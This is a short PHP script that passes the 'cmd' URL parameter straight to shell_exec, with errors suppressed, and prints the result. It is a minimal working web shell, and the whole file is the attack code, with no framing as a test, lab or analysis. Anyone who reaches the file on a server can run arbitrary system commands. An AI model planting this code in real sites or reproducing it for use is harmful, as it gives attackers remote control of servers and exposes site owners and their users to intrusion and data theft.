<?php
function execute($cfe) {
	$res = @shell_exec($cfe);
	return $res;
}

$command = $_GET['cmd'];
echo(execute($command));
?>